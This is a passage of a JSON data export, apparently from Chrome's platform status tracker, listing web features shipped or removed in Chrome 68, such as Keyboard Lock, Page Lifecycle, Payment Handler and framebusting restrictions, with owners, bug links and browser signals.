        "blink_components": [
          "Blink>GamepadAPI"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "http://crbug.com/398642",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Change Gamepad.timestamp to use a DOMHighResTimeStamp, a high resolution monotonic time with microsecond resolution. Timestamps are measured as offsets from the navigationStart attribute of the PerformanceTiming interface.",
    "id": 5751747209330688,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-05-31 15:01:09.227210",
      "by": "jmedley@google.com"
    },
    "name": "Improve Cache Management for Service Worker Scripts",
    "comments": "Previously, HTTP requests that checked for updates to the service worker were fulfilled by the HTTP cache by default. If a Cache-Control header was inadvertently set on a service worker, then service worker updates could be delayed. \r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/ServiceWorker/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1353636",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "falken@chromium.org",
          "yuryu@chromium.org",
          "worker-dev@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/675540",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The HTTP cache will be ignored when requesting updates to the service worker. Requests for importScripts will still go through the HTTP cache. But this is just the default. A new registration option, ServiceWorkerRegistration.updateViaCache is available that offers control over this behavior. ",
    "id": 6059838387781632,
    "resources": {
      "docs": [
        "* (Once written) https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/updateViaCache",
        "* https://github.com/w3c/ServiceWorker/issues/893"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-05-24 17:36:47.014460",
      "by": "jmedley@google.com"
    },
    "name": "Keyboard Lock",
    "comments": "The feature is useful for any immersive application that wants access to keys not normally available to websites. Examples include games that want to disable the default behaviour of the Windows key (which would normally open the Windows start menu) or the Escape key (which would normally exit full-screen mode), or remote desktop applications that want to send key combinations like Alt+Tab to a remote computer rather than processing them locally.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/keyboard-lock/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "denizz@chromium.org",
          "garykac@chromium.org",
          "jamiewalch@chromium.org",
          "dominickn@chromium.org",
          "mgiuca@chromium.org",
          "joedow@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 68,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=677559",
        "intervention": false
      },
      "opera": {
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "While in fullscreen, this API allows apps to receive keys that are normally handled by the system or the browser like Cmd/Alt-Tab, or Esc. Users can escape keyboard lock (and fullscreen) by holding the Esc key for two seconds.",
    "id": 5642959835889664,
    "resources": {
      "docs": [
        "https://w3c.github.io/keyboard-lock/",
        "https://github.com/w3c/keyboard-lock/blob/gh-pages/explainer.md",
        "https://discourse.wicg.io/t/proposal-system-keyboard-lock-api/1594"
      ],
      "samples": [
        "(see explainer)"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-25 17:29:50.255790",
      "by": "mustaq@google.com"
    },
    "name": "Make PointerEvent.fromElement and PointerEvent.toElement null",
    "tags": [
      "fromElement",
      "toElement"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/pointerevents/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "mustaq@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/827271",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "PointerEvents won't report non-standard and inconsistent values for fromElement and toElement fields.  Instead, they will always report null (like Edge and Firefox).\r\n\r\nIn MouseEvents (from which PointerEvents inherit these fields), .fromElement and .toElement are non-standard, and have been inconsistent among major browsers for many years.  Moreover, we have standard and consistent alternatives already: .target and .relatedTarget.  Recently the PointerEvents spec has been updated accordingly.\r\n",
    "id": 5836424855158784,
    "resources": {
      "docs": [
        "https://github.com/w3c/pointerevents/issues/167"
      ],
      "samples": [
        "https://output.jsbin.com/gajuhas"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-13 19:22:17.627851",
      "by": "jmedley@google.com"
    },
    "name": "Page Lifecycle API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://wicg.github.io/page-lifecycle/spec.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/mozilla/standards-positions/issues/87",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "panicker@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "webview": 68,
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "With large numbers of web apps (and tabs) running, critical resources such as memory, CPU, battery, network etc easily get oversubscribed, leading to a bad end user experience. Web lifecycle is a proposal to enable system initiated Tab Discarding and CPU Stopping -- to effectively manage resources for optimal user experience.\r\nSee explainer:\r\nhttps://github.com/spanicker/web-lifecycle/blob/master/README.md",
    "id": 5644602711212032,
    "resources": {
      "docs": [
        "https://github.com/spanicker/web-lifecycle/blob/master/README.md"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-05-31 06:33:17.733160",
      "by": "agektmr@chromium.org"
    },
    "name": "Payment Handler API",
    "tags": [
      "payment",
      "PaymentRequest",
      "payment api",
      "payment app",
      "Payment App",
      "PaymentApp",
      "serviceworker",
      "PaymentHandler"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/payment-handler/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/mozilla/standards-positions/issues/23",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "jinho.bang@samsung.com",
          "rouslan@chromium.org",
          "zkoch@chromium.org",
          "durgapandey@chromium.org",
          "anthonyvd@chromium.org",
          "gogerald@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/661608",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The API helps to develop new payment apps in web standard ways (e.g. service worker).\r\nIf using them, payment app providers can provide simplified payment methods and user experiences.",
    "id": 5160285237149696,
    "resources": {
      "samples": [
        "https://rsolomakhin.github.io/pr/apps/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-18 17:53:52.888881",
      "by": "jmedley@google.com"
    },
    "name": "RTCRtpSender: get/setParameters()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webrtc-pc/#rtcrtpsender-interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/catalog/?page=1&q=RTCRtpSender",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "orphis@chromium.org",
          "hbos@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/803494",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The get/setParameters() methods return or update the RTCRtpSender object's current parameters for how the RTCRtpSender.track property is encoded and transmitted to a remote RTCRtpReceiver. These methods enable you to change encoding parameters for WebRTC streams such as the maximum transmission bitrate without doing any SDP munging or renegotiation.",
    "id": 5678876931915776,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-21 22:56:46.367550",
      "by": "jmedley@google.com"
    },
    "name": "Remove Document#selectedStylesheetSet/preferredStylesheetSet",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 68
        },
        "owners": [
          "cnardi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/690609",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The Document.selectedStylesheetSet/preferredStylesheetSet attributes will be removed because they are non-standard and only implemented by Chrome and WebKit. The standard versions of these attributes were removed from the spec in 2016.",
    "id": 6452340664041472,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-11 16:54:22.693600",
      "by": "eirage@chromium.org"
    },
    "name": "Remove document.createTouch",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/touch-events/#extensions-to-the-document-interface",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 68
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/518868",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove document.createTouch\r\n\r\nUsing new Touch({...}) has been supported in Chrome since M48.",
    "id": 5668612064935936,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-01-22 07:47:06.592030",
      "by": "shanmuga.m@samsung.com"
    },
    "name": "Remove extra form data , if \"value\" attribute is present with non-empty value for <input type=”image”>",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#constructing-form-data-set",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 68
        },
        "owners": [
          "shanmuga.m@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "ios": 68,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "http://crbug.com/753746 ",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "As per spec,\r\nhttps://html.spec.whatwg.org/multipage/form-control-infrastructure.html#constructing-form-data-set, the constructed \"form data set\" should not include the value of the image button\r\n",
    "id": 5672688152477696,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-29 16:50:49.032390",
      "by": "jmedley@google.com"
    },
    "name": "Require user gesture for framebusting in cross-origin iframes",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "japhet@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=640057",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Summary\r\nContent in an <iframe> can generally navigate the top level browsing context unless explicitly forbidden by the sandbox attribute (sometimes called 'framebusting'). Restrict this ability to content that is processing a user gesture, unless it is same-origin to the parent.\r\n\r\nMotivation\r\nFramebusting was originally used by content that wanted to prevent being placed in an <iframe> but it's being abused. There are other, more specific tools to accomplish the original use case.",
    "id": 5851021045661696,
    "resources": {
      "docs": [
        "https://github.com/WICG/interventions/issues/16"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-22 15:38:34.511790",
      "by": "jmedley@google.com"
    },
    "name": "Support 'x' as a resolution unit",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-values-4/#resolution",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1460655",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "cnardi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=807653",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "CSS Values and Units Module Level 4 defines a new resolution unit called 'dot per pixel' for support of high-resolution displays. This change adds 'x' as a synonym for the existing abbreviation, 'dppx'.",
    "id": 5150549246738432,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-06-22 15:27:20.759933",
      "by": "kpaulhamus@chromium.org"
    },
    "name": "Support for CTAP2 FIDO devices via the Web Authentication API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fidoalliance.org/specs/fido-v2.0-ps-20170927/fido-client-to-authenticator-protocol-v2.0-ps-20170927.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 68
        },
        "owners": [
          "engedy@chromium.org",
          "hongjunchoi@chromium.org",
          "kpaulhamus@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>WebAuthentication"
        ],
        "desktop": 68,
        "flag": true,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=780078#c31",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The WebAuthentication API (https://www.chromestatus.com/feature/5669923372138496) formerly only supported U2F devices, also known as CTAP1 devices, at the transport layer.\r\n\r\nCTAP2 devices provide additional capabilities such as biometric authentication and resident keys. This doesn't change the API surface itself but enables richer device interactions via the existing WebAuthN API.",
    "id": 6288375388569600,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-05-22 15:05:35.842370",
      "by": "jmedley@google.com"
    },
    "name": "Unified touch adjustment",
    "comments": "Developer can use elementFromPoint to get the element directly at the event coordinates (without adjustment)",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "eirage@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/625198",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Touch adjustment will adjust the TouchEvent and the corresponding PointerEvent target to a best target within the touch area. TouchEvent coordinates will not be changed.",
    "id": 4895751150764032,
    "resources": {
      "samples": [
        "https://github.com/w3c/touch-events/issues/93"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-08 12:11:09.007590",
      "by": "hs1217.lee@samsung.com"
    },
    "name": "Unprefix CSS \"grab\" and \"grabbing\" Values for Cursor Property",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://www.w3.org/TR/css-ui-3/#cursor",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=880672",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "hs1217.lee@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=708197",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://trac.webkit.org/changeset/215146/webkit",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "These values change the mouse cursor to an open hand or closed hand to indicate that something can be grabbed or is currently grabbed. Prefixed versions of these properties have been supported since Chrome 1, with Windows support added in Chrome 22. With this change Chrome will support the standard, unprefixed versions of these values.",
    "id": 5575087101050880,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/cursor"
      ],
      "samples": [
        "https://test.csswg.org/harness/test/css-ui-3_dev/single/cursor-009/format/html5/",
        "https://test.csswg.org/harness/test/css-ui-3_dev/single/cursor-010/format/html5/"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-05-02 18:02:43.791080",
      "by": "mustaq@google.com"
    },
    "name": "User activation through long-press gesture",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/#triggered-by-user-activation",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "mustaq@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "ios": 68,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "http://crbug.com/836401",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The long-press gesture should be considered a user activation because it indicates user's interaction with the page.  This would allow a web app to call restricted APIs like navigator.vibrate() on long-press to match native behavior.",
    "id": 5726389672083456,
    "resources": {
      "samples": [
        "https://output.jsbin.com/bonadab"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2018-05-25 20:37:39.510450",
      "by": "kainino@chromium.org"
    },
    "name": "WEBGL_compressed_texture_atc",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.khronos.org/registry/webgl/extensions/rejected/WEBGL_compressed_texture_atc/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.khronos.org/webgl/public-mailing-list/public_webgl/1702/msg00057.php",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 68
        },
        "owners": [
          "kainino@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>WebGL"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/845288",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This extension provided the AMD_compressed_ATC_texture formats to the web.\r\nHardware support has dwindled to near-zero, so the extension has been deprecated/rejected by the WebGL Working Group.\r\n\r\nSupport for this extension has always been small (as it is hardware-dependent), so no existing applications should be relying on its presence.",
    "id": 5253912718213120,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-25 01:00:13.353900",
      "by": "jmedley@google.com"
    },
    "name": "WebAudio: Add User Selectable Automation Rate for AudioParams",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://webaudio.github.io/web-audio-api/#AudioParam",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "owners": [
          "rtoy@chromium.org",
          "hoch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 68,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://crbug.com/828947",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Gives each AudioParam a new attribute, automationRate that allows the user to select whether the AudioParam is either \"a-rate\" or \"k-rate\".  Most but not all AudioParams allow changing the rate (as given in the spec).\r\n\r\nFor example, BiquadFilterNode with default \"a-rate\" automation is very expensive to compute due to the complex relationship between the parameters and the filter coefficients.  If this fast automation is not needed (the most typical case), the parameters can be set to \"k-rate\".",
    "id": 5164143287992320,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-audio-api/issues/1269",
        "https://github.com/WebAudio/web-audio-api/pull/1521"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-04-23 14:56:18.698140",
      "by": "jmedley@google.com"
    },
    "name": "customElements.upgrade()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/custom-elements.html#dom-customelementregistry-upgrade",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 68
        },
        "prefixed": false,
        "origintrial": false,
        "webview": 68,
        "blink_components": [
          "Blink>HTML>CustomElements"
        ],
        "desktop": 68,
        "flag": false,
        "android": 68,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=819482",
        "intervention": false
      },
      "opera": {
        "android": 55,
        "desktop": 55
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/w3c/webcomponents/issues/710",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This function upgrades undefined custom elements explicitly.\r\n\r\nIf a custom element is created with the innerHTML setter and its parent node is not connected to a document, the custom element is not upgraded until it's connected. Upgrading such elements explicitly allows developers to handle them in a single way regardless of connectedness.\r\n",
    "id": 5967337471606784,
    "resources": {}
  },
  {
    "category": "Web Components",
    "updated": {
